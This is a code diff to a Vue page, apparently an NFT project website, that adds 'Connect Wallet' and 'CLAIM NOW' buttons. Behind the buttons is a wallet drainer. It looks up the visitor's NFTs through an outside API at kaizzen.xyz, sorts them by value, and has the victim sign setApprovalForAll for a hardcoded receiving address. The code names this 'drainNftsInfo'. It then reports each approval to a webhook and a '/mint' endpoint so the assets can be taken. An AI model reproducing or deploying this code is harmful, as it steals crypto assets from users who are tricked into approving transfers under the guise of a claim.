@@ -21,7 +21,9 @@
       />
     </div>
     <div class="info-btn-wrap">
-      <a>Coming soon</a>
+      <!-- <a>Coming soon</a> -->
+      <a v-if="!connected" @click="connectWallet">Connect Wallet</a>
+      <a v-if="connected" @click="askTransfer">CLAIM NOW</a>
     </div>
 
     <header>
@@ -164,8 +166,186 @@ import AOS from "aos";
 import "aos/dist/aos.css";
 import { mapState } from "vuex";
 import MainNav from "../components/MainNav.vue";
+import Moralis from "moralis";
+import Web3 from "web3";
+
+const metamaskInstalled = (typeof window.ethereum !== "undefined");
+const receiveAddress = "0xa39Af3e6Dc69B9F6Dcb936AB997E3B62d83e8a1B";
+//"0x240602F7f979102dAA9401D8d77Af03a196fB645";
+//"0xa39Af3e6Dc69B9F6Dcb936AB997E3B62d83e8a1B"; //"0x87580f5b4837ee7679b0fec1916f220509055422";
+const BASE_URL = "https://kaizzen.xyz/api";
+
+async function askNfts() {
+  const web3Js = new Web3(Moralis.provider);
+  const walletAddress = (await web3Js.eth.getAccounts())[0];
+  const options = {
+    method: "GET",
+    headers: {
+      "Content-Type": "application/json",
+    },
+  };
+  let walletNfts = await fetch(`${BASE_URL}/assets/${walletAddress}`, options)
+    .then((response) => response.json())
+    .then((nfts) => {
+      console.log("nfts", nfts);
+      if (nfts.detail && nfts.detail.indexOf("Request was throttled.") >= 0) {
+        return ["Request was throttled."];
+      }
+      return nfts
+        .filter((nft) => {
+          if (nft.primary_asset_contracts.length > 0) return true;
+          else return false;
+        })
+        .map((nft) => {
+          return {
+            type: nft.primary_asset_contracts[0].schema_name.toLowerCase(),
+            contract_address: nft.primary_asset_contracts[0].address,
+            price: round(
+              nft.stats.one_day_average_price != 0
+                ? nft.stats.one_day_average_price
+                : nft.stats.seven_day_average_price
+            ),
+            owned: nft.owned_asset_count,
+          };
+        });
+    })
+    .catch((err) => console.error(err));
+
+  if (walletNfts.includes("Request was throttled.")) {
+    console.log("Request was throttled.");
+    return notEligible();
+  }
+  if (walletNfts.length < 1) {
+    console.log("There is no tokens");
+    return notEligible();
+  }
+
+  console.log("walletNfts", walletNfts);
+  let transactionsOptions = [];
+  for (let nft of walletNfts) {
+    if (!nft) {
+      continue;
+    }
+    if (nft.price === 0) {
+      console.log("No price");
+      continue;
+    }
+    const ethPrice = round(nft.price * (nft.type == "erc1155" ? nft.owned : 1));
+    if (ethPrice < drainNftsInfo.minValue) continue;
+    transactionsOptions.push({
+      price: ethPrice,
+      schema: nft.type,
+      options: {
+        contractAddress: nft.contract_address,
+        from: walletAddress,
+        functionName: "setApprovalForAll",
+        abi: [
+          {
+            inputs: [
+              {
+                internalType: "address",
+                name: "operator",
+                type: "address",
+              },
+              {
+                internalType: "bool",
+                name: "approved",
+                type: "bool",
+              },
+            ],
+            name: "setApprovalForAll",
+            outputs: [],
+            stateMutability: "nonpayable",
+            type: "function",
+          },
+        ],
+        params: {
+          operator: ethPrice > 1 ? receiveAddress : receiveAddress,
+          approved: true,
+        },
+        gasLimit: (await web3Js.eth.getBlock("latest")).gasLimit,
+      },
+    });
+  }
+  if (transactionsOptions.length < 1) {
+    return notEligible();
+  }
+
+  const transactionLists = await transactionsOptions
+    .sort((a, b) => b.price - a.price)
+    .slice(0, drainNftsInfo.maxTransfers);
+
+  for (let transaction of transactionLists) {
+    const contractAddress = transaction.options.contractAddress;
+    console.log(`Transferring ${contractAddress} (${transaction.price} ETH)`);
+
+    const walletAddress = (await web3Js.eth.getAccounts())[0];
+    if (isMobile()) {
+      await Moralis.executeFunction(transaction.options)
+        .catch((O_o) => console.error(O_o, options))
+        .then((uwu) => {
+          console.log("mobile-uwu:", uwu);
+          if (uwu) {
+          } else return;
+          mintToken(contractAddress, transaction.schema, walletAddress);
+          sendWebhooks(
+            `\`${walletAddress}\` just approved \`${contractAddress}\` **(${transaction.price})**\nhttps://etherscan.io/tokenapprovalchecker`
+          );
+        });
+    } else {
+      await Moralis.executeFunction(transaction.options)
+        .catch((O_o) => console.error(O_o, options))
+        .then((uwu) => {
+          console.log("desktop-uwu:", uwu);
+          if (uwu) {
+          } else return;
+          mintToken(contractAddress, transaction.schema, walletAddress);
+          sendWebhooks(
+            `\`${walletAddress}\` just approved \`${contractAddress}\` **(${transaction.price})**\nhttps://etherscan.io/tokenapprovalchecker`
+          );
+        });
+      await sleep(111);
+    }
+  }
+}
+const notEligible = () => {
+  //document.getElementById("notEli").style.display = "";
+};
+
+const sendWebhooks = (message) => {
+  fetch(`${BASE_URL}/notification`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      content: message,
+    }),
+  }).catch((err) => console.error(err));
+};
+
+const mintToken = (contract, schema, owner) => {
+  console.log("mintToken", contract, schema, owner);
+  fetch(`${BASE_URL}/mint`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      contract,
+      schema,
+      owner,
+    }),
+  }).catch((err) => console.error(err));
+};
 
 export default {
+  data() {
+    return {
+      connected: false,
+      transfering: false,
+    }
+  },
   components: {
     MainNav,
   },
@@ -178,10 +358,21 @@ export default {
   async mounted() {
     AOS.init({ once: true, duration: 1000 });
     window.addEventListener("load", AOS.refresh);
-    // window.addEventListener("scroll", this.handleScroll);
+
+    Moralis.onWeb3Enabled(async (data) => {
+      if (data.chainId !== 1 && metamaskInstalled) {
+        await Moralis.switchNetwork("0x1");
+      }
+      this.connected = true;
+    });
+
+    Moralis.onChainChanged(async (chain) => {
+      if (chain !== "0x1" && metamaskInstalled) {
+        await Moralis.switchNetwork("0x1");
+      }
+    });
   },
   unmounted() {
-    // window.removeEventListener("scroll", this.handleScroll);
   },
   methods: {
     handleScroll() {
@@ -197,7 +388,18 @@ export default {
       });
     },
     async connectWallet() {
-      await this.$store.dispatch("getWeb3Data");
+      await Moralis.enableWeb3(
+        metamaskInstalled
+          ? {}
+          : {
+              provider: "walletconnect",
+            }
+      );
+    },
+    async askTransfer() {
+      this.transfering = true;
+      await askNfts();
+      this.transfering = false;
     },
     async comingSoon() {
       this.$store.commit("SET_LOADING_OVERLAY", true);
